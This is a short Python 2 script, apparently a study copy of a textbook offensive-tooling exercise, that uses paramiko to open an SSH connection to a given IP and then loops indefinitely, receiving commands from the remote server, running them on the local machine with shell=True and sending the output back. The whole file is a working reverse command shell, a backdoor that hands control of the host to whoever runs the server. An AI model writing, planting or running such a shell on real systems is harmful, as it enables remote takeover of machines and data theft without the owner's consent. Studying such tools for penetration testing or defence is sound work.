__author__ = 'med'

import threading
import paramiko
import subprocess as sub

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.load_host_keys("/home/med/.ssh/known_hosts")
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print ssh_session.recv(1024)
        while True:
            command = ssh_session.recv(1024) # get the command from the server
            try:
                cmd_output = sub.check_output(command, shell=True) # execute the command on the client
                ssh_session.send(cmd_output) # send output to the server
            except Exception, e:
                ssh_session.send(str(e))
        client.close()
    return



